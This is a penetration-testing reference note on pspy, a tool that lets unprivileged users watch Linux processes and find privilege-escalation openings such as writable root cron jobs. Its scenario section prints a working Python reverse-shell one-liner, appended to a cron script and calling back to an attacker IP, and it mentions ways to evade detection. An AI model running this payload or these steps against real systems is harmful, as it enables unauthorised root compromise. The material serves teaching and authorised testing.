---
tags: [tools, privesc, enumeration, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.71 pspy Linux Process Snooper"
---

# pspy: Linux Process Snooper

## 1. Introduction and Core Purpose

`pspy` is an advanced command-line utility designed to monitor and snoop on running processes on Linux systems without requiring root privileges. It is an indispensable tool during the privilege escalation phase of a penetration test or capture-the-flag (CTF) exercise. Its primary capability is to reveal commands executed by other users, recurring cron jobs, and background background scripts in real-time as they are launched.

Unlike traditional process monitoring tools like `top` or `ps`, which provide a static or sampled snapshot of currently running processes, `pspy` is event-driven. This allows it to capture fleeting, short-lived processes that might execute and terminate in a fraction of a second—long before a user manually invoking `ps` could observe them.

### 1.1 How pspy Works (Under the Hood)

The genius of `pspy` lies in its ability to bypass the need for root privileges by leveraging standard Linux kernel interfaces that are readable by unprivileged users. Specifically, it employs the `inotify` API to monitor events within the `/proc` filesystem.

In Linux, every running process has a corresponding directory in `/proc/` named after its Process ID (PID). When a new process starts, the kernel creates a new directory (e.g., `/proc/1234`). Unprivileged users typically have read access to the directory structure of `/proc`, even if they cannot read the contents of certain sensitive files (like `environ` or `mem`) belonging to processes owned by other users.

`pspy` places `inotify` watches on `/proc`. When an `IN_CREATE` or `IN_MODIFY` event triggers due to the creation of a new PID directory, `pspy` rapidly reads the corresponding `/proc/<PID>/cmdline` file. Since `cmdline` contains the exact command and arguments used to invoke the process, and is often globally readable, `pspy` can extract and display this information to the attacker.

## 2. ASCII Architecture Diagram

```text
+-----------------------------------------------------------------------------------+
|                               Linux Operating System                              |
|                                                                                   |
|  +-----------------+       +---------------------------------------------------+  |
|  |                 |       |                   /proc Filesystem                |  |
|  |   Cron Daemon   |------>|  Creates /proc/<PID>/                             |  |
|  |  (Runs task as  |       |  e.g., /proc/9998/cmdline = "/opt/backup.sh"      |  |
|  |      root)      |       +---------------------------------------------------+  |
|  +-----------------+                 ^                                            |
|                                      | Trigger (inotify IN_CREATE)                |
|                                      |                                            |
|  +-----------------+       +---------------------------------------------------+  |
|  |                 |       |                       pspy                        |  |
|  |   User 'alice'  |------>|  1. Sets inotify watch on /proc/                  |  |
|  |  (Runs script)  |       |  2. Detects new directory (e.g., 9998)            |  |
|  +-----------------+       |  3. Rapidly reads /proc/9998/cmdline              |  |
|                            |  4. Parses User ID (UID) from /proc/9998/status   |  |
|                            |  5. Outputs formatted log to stdout               |  |
|                            +---------------------------------------------------+  |
|                                      |                                            |
|                                      v                                            |
|                            [Attacker Terminal Output]                             |
|                            2026/06/09 10:05:01 CMD: UID=0 PID=9998 | /bin/bash    |
+-----------------------------------------------------------------------------------+
```

## 3. Deployment and Execution

### 3.1 Transferring pspy
`pspy` is typically distributed as a statically compiled binary written in Go. This means it requires no external dependencies (like glibc versions), making it highly portable across various Linux distributions and architectures.

Download the appropriate version (32-bit or 64-bit) for the target architecture:
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
```

### 3.2 Basic Execution
Running `pspy` without arguments starts the snooper with default settings, printing process events to standard output.
```bash
./pspy64
```
Output format:
```text
2026/06/09 10:15:02 CMD: UID=0    PID=1045   | /usr/sbin/CRON -f 
2026/06/09 10:15:02 CMD: UID=0    PID=1046   | /bin/sh -c /root/scripts/cleanup.sh 
2026/06/09 10:15:02 CMD: UID=0    PID=1047   | /bin/bash /root/scripts/cleanup.sh 
2026/06/09 10:15:02 CMD: UID=0    PID=1048   | rm -rf /tmp/backup_* 
```
In this example, we see the root cron daemon triggering a script named `cleanup.sh`, which in turn executes an `rm` command. If `/root/scripts/cleanup.sh` is writable by our unprivileged user, this immediately presents a trivial privilege escalation vector.

### 3.3 Advanced Options and Filtering
`pspy` can generate a massive amount of output on busy servers. It includes several flags to filter and refine the data.

- **`-p` (Process Tracking):** Enables tracking of process executions (default).
- **`-f` (File System Events):** Enables monitoring of file system events in specific directories (like `/usr`, `/tmp`, `/etc`). This uses `inotify` to track changes to files, which can reveal what files a process is modifying.
- **`-i <ms>` (Interval):** Sets the scanning interval in milliseconds. By default, it's 100ms. Lowering this increases the chance of catching extremely short-lived processes but consumes more CPU.
- **`-c` (Color):** Colorizes output for better readability.
- **`-d <dir>` (Directory Watch):** Specifies additional directories to watch with `inotify` when `-f` is enabled.

#### Example: Watching File Events
```bash
./pspy64 -p -f -d /opt/app/
```
This command will track processes AND watch for any file modifications, creations, or deletions within `/opt/app/`. If a scheduled task writes a temporary log file there, `pspy` will log the file creation event.

## 4. Identifying Privilege Escalation Vectors with pspy

`pspy` is not an exploit; it is an enumeration tool. The data it provides must be analyzed to identify vulnerabilities. Common patterns to look for include:

### 4.1 Vulnerable Cron Jobs
The most common use case for `pspy`. Look for commands executed periodically with `UID=0`.
- **Writable Scripts:** Does the cron job execute a bash or Python script that the current user has write access to? If so, inject a reverse shell payload.
- **Wildcard Injection:** Does the cron job use wildcards (e.g., `tar -czf backup.tar.gz /var/www/html/*`)? If we can create files in `/var/www/html/`, we can create files with names like `--checkpoint=1` to inject arguments into the `tar` command.
- **Path Hijacking:** Does the cron job rely on a relative path or an insecure `$PATH` environment variable?

### 4.2 Hardcoded Credentials
Sometimes, scripts executed by other users pass sensitive credentials directly via command-line arguments.
```text
2026/06/09 10:30:15 CMD: UID=1000 PID=5521 | mysql -u dbadmin -pSuperSecretP@ssw0rd database_name
```
Because `pspy` captures the full `cmdline`, these passwords are exposed in plaintext.

### 4.3 Insecure Temporary File Creation
Monitor for scripts that create files in predictable locations like `/tmp` or `/dev/shm`.
```text
2026/06/09 10:45:00 CMD: UID=0 PID=8812 | /bin/bash -c "echo 'System Health OK' > /tmp/health_check.log"
```
If the script doesn't handle symlinks securely, an attacker could create a symbolic link at `/tmp/health_check.log` pointing to a critical system file (like `/etc/shadow` or `/etc/passwd`). When the root script runs, it will overwrite the target file, potentially leading to a Denial of Service or privilege escalation.

### 4.4 Automated Application Deployments (CI/CD)
On servers acting as deployment targets, `pspy` can reveal the commands executed by the CI/CD runner (e.g., GitLab Runner, Jenkins agent). These runners often handle SSH keys, API tokens, or deployment scripts that can be hijacked.

## 5. Evasion and Limitations

### 5.1 Kernel Defenses
Modern Linux kernels include features to restrict unprivileged access to `/proc`. Specifically, the `hidepid` mount option for `procfs`.
- `hidepid=1`: Users can only see their own processes. They cannot see the command lines of other users' processes.
- `hidepid=2`: The entire PID directory of other users is hidden.

If a system is mounted with `hidepid=1` or `hidepid=2` (e.g., in `/etc/fstab`), `pspy` will be largely ineffective for cross-user process snooping. It will only capture processes spawned by the user running `pspy`.
```bash
# Checking for hidepid
mount | grep proc
```

### 5.2 Short-Lived Process Race Conditions
While `pspy` is fast, it operates in user-space. A process can technically start, perform its action, and exit before `pspy`'s `inotify` loop processes the event and reads the `/proc/<PID>/cmdline` file. In such cases, `pspy` might detect the PID creation but fail to read the command line, resulting in an empty or incomplete log entry. This is a fundamental limitation of the polling/event mechanism compared to kernel-space tracing (like eBPF).

### 5.3 Detection
Running `pspy` is extremely noisy. Blue teams monitoring process execution or `inotify` usage can easily detect the `pspy` binary. The constant reading of `/proc` can also generate a distinct behavioral signature. To mitigate this, attackers may rename the binary, execute it entirely from memory (e.g., via `memfd_create`), or compile a custom, stripped-down version.

## 6. Real-World Scenario: Exploiting a Cron Job

1. **Execution:** Attacker gains low-privileged shell as user `www-data`.
2. **Monitoring:** Attacker uploads and runs `./pspy64`.
3. **Observation:** Every 2 minutes, `pspy` logs:
   `CMD: UID=0 PID=4012 | /usr/bin/python3 /opt/maintenance/cleanup.py`
4. **Investigation:** Attacker checks permissions of the script:
   `ls -la /opt/maintenance/cleanup.py`
   Result: `-rwxrwxr-x 1 root www-data 1.2K Jun 9 10:00 /opt/maintenance/cleanup.py`
5. **Exploitation:** The file is writable by the `www-data` group.
   Attacker appends a reverse shell payload:
   `echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /opt/maintenance/cleanup.py`
6. **Execution:** Attacker sets up a netcat listener (`nc -lvnp 4444`). Two minutes later, the root cron job executes the modified script, granting a root shell.

## 7. Chaining Opportunities
- **[[Privilege Escalation]]**: `pspy` is the primary discovery tool for time-based and event-based privesc vectors.
- **[[File Permissions]]**: Findings from `pspy` directly lead to analyzing file and directory ACLs using tools like `find` or `getfacl`.
- **[[Wildcard Injection]]**: A specific attack technique often identified through `pspy` output.
- **[[Environment Variable Hijacking]]**: Analyzing the `$PATH` context of commands captured by `pspy`.

## 8. Related Notes
- [[72 - LinPEAS Complete Output Analysis]]: LinPEAS identifies static misconfigurations, while `pspy` identifies dynamic runtime vulnerabilities. They are highly complementary.
- [[Cron Job Exploitation]]: Deep dive into exploiting the mechanisms discovered by `pspy`.
- [[Linux Enumeration Techniques]]: Broader strategies for mapping a Linux host.
